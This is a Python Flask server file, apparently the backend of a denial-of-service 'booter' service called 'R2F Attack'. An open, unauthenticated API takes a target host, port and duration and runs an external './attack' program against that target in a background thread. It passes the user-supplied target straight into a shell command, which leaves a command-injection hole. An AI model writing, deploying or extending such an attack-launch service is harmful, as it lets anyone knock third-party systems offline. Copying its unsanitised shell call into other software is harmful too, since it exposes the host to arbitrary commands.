import os
import threading
import time
import subprocess
import logging

from flask import Flask, request, jsonify

logging.basicConfig(filename='server.log', level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

app = Flask(__name__)

@app.route('/')
def index():
    return "R2F Attack Backend Server is active and running successfully! 🚀", 200

@app.route('/health')
def health():
    return jsonify({"status": "healthy"}), 200

@app.route('/api/launch_attack', methods=['POST'])
def api_launch_attack():
    try:
        data = request.json
        if not data:
            return jsonify({"status": "error", "message": "Invalid JSON data"}), 400

        target = data.get("target")
        port = data.get("port")
        duration = data.get("duration")

        if not target or port is None or duration is None:
            return jsonify({"status": "error", "message": "Missing required parameters"}), 400

        try:
            port = int(port)
            duration = int(duration)
        except ValueError:
            return jsonify({"status": "error", "message": "Invalid port or duration format"}), 400

        if duration > 300:
            return jsonify({"status": "error", "message": "Time interval must be less than or equal to 300 seconds."}), 400

        # Execute Attack in Background Thread (Open Access for Everyone)
        threading.Thread(
            target=execute_api_attack_bg, 
            args=(target, port, duration), 
            daemon=True
        ).start()

        return jsonify({"status": "success", "message": "Attack Started Successfully!"}), 200

    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

def execute_api_attack_bg(target, port, attack_time):
    full_command = f"./attack {target} {port} {attack_time} 300"
    try:
        subprocess.run(full_command, shell=True, timeout=attack_time + 10)
    except Exception as e:
        logging.error(f"API Attack execution error: {e}")

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
